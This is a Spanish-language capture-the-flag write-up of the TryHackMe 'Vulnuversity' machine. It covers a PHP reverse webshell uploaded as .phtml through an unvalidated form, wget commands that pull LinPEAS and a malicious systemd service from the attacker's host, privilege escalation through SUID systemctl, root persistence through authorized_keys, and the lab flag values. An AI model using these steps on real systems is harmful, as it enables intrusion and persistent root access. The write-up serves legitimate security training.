# Vulnuversity — TryHackMe

**Plataforma:** TryHackMe
**Sistema operativo:** Linux
**Dificultad:** Fácil/Media
**Categoría:** File Upload sin validación, SUID binary abuse (systemctl)

## Resumen

Máquina Linux que simula el sitio de una universidad con un formulario de carga de archivos sin validación de extensión, lo que permite subir una webshell PHP. Tras obtener acceso como `www-data`, se identifica un binario con permiso SUID (`systemctl`) que permite escalar directamente a root.

## 1. Reconocimiento

```bash
sudo ./alien-script.sh <IP>
```

| IP | Sistema Operativo | Puertos/Servicios |
|---|---|---|
| Objetivo | Linux | 21 (FTP), 22 (SSH), 139/445 (SMB), 3128 (Squid Proxy), 3333 (HTTP) |

## 2. Análisis de vulnerabilidades

```bash
nmap -n -Pn --min-rate 3000 -vv --script vuln -p21,22,139,445,3128,3333 \
  -oA nmap/vuln_scan <IP>
```

El escaneo de vulnerabilidades no reveló CVEs explotables directamente, por lo que se procedió con fuzzing web sobre los puertos HTTP (3128 y 3333).

### Fuzzing puerto 3128 (Squid Proxy)

```bash
gobuster dir -u http://<IP>:3128 -w /usr/share/dirb/wordlists/common.txt \
  -x txt,php,zip -s 200,204,301,302,307,401,403 -t 200 -k
```

**Resultado:** sin directorios relevantes.

### Fuzzing puerto 3333

```bash
gobuster dir -u http://<IP>:3333 -w /usr/share/dirb/wordlists/common.txt \
  -x txt,php,zip -s 200,204,301,302,307,401,403 -t 200 -k
```

**Resultados relevantes:** `/internal` y `/internal/uploads` — un formulario de carga de archivos sin validación de extensión (vulnerabilidad de **File Upload**).

## 3. Explotación

**Manual** — sin automatización.

Se generó una webshell reversa en PHP (Reverse Shell Generator) y se guardó con extensión `.phtml` (extensión alternativa que los servidores Apache suelen interpretar como PHP, útil para evadir validaciones básicas de extensión).

Se subió el archivo mediante el formulario vulnerable en `/internal/uploads/` y se verificó su carga accediendo directamente a:

```
http://<IP>:3333/internal/uploads/shell.phtml
```

Con un listener activo:

```bash
nc -lvnp 5000
```

Al ejecutar el archivo se obtuvo acceso como **www-data**.

Exploración del sistema — en `/home/` se identificó el usuario **bill**, con la primera bandera en su directorio (`user.txt`).

## 4. Escalada de privilegios

Se subió y ejecutó **LinPEAS**:

```bash
wget http://<IP_atacante>:8000/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```

LinPEAS identificó un binario crítico con permisos SUID: **`/bin/systemctl`**, listado en GTFOBins como explotable para obtener shell como root.

### Explotación del SUID systemctl

Se creó un archivo de servicio malicioso (`root.service`) que ejecuta una reverse shell al iniciarse, y se cargó vía el propio servidor HTTP del atacante:

```bash
wget http://<IP_atacante>:8000/root.service
systemctl enable /dev/shm/root.service
systemctl start root
```

Con un listener activo:

```bash
nc -lvnp 6000
```

Al activarse el servicio, se recibió una shell como **root**.

```
whoami
root
```

**Segunda bandera** localizada en `/root/root.txt`.

### Persistencia (extra opcional)

Igual que en Mr. Robot, se implementó persistencia mediante `authorized_keys` en `/root/.ssh/`, permitiendo acceso root continuo por SSH sin contraseña y sin crear usuarios nuevos.

## 5. Banderas

| Bandera | Valor |
|---|---|
| Bandera usuario (bill) | `8bd7992fbe8a6ad22a63361004cfcedb` |
| Bandera root | `a58ff8579f0a9270368d33a9966c7fd5` |

## 6. Herramientas usadas

- alien-script / Nmap
- Gobuster
- Reverse Shell Generator (pentestmonkey)
- Netcat
- LinPEAS
- GTFOBins
- SSH

## 7. Conclusiones y recomendaciones

1. Las fallas en validación de archivos subidos (permitir `.phtml`) facilitaron la obtención de acceso inicial.
2. La presencia de binarios con permisos SUID inseguros (`systemctl`) permitió escalada directa documentada en GTFOBins.
3. **Recomendación:** implementar validación estricta de tipo de archivo (whitelist de extensiones + validación de contenido), auditar y eliminar permisos SUID innecesarios, e implementar monitoreo de cambios en archivos críticos del sistema.
